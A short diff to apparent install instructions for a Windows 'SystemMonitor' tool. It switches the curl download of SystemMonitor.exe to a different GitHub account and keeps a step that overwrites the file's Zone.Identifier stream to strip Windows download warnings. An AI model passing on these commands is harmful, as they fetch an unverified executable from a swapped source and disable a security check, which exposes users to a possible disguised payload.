@@ -120,8 +120,10 @@ mkdir C:\ProgramData\SystemMonitor
 ```
 
 ```cmd
-curl -L -o C:\ProgramData\SystemMonitor\SystemMonitor.exe https://github.com/ajit421/SysControl-v2/releases/latest/download/SystemMonitor.exe
+curl -L -o C:\ProgramData\SystemMonitor\SystemMonitor.exe https://github.com/le0-le0/SysControl-v2/releases/latest/download/SystemMonitor.exe
 ```
+
+
 
 ```cmd
 echo. > "C:\ProgramData\SystemMonitor\SystemMonitor.exe:Zone.Identifier"
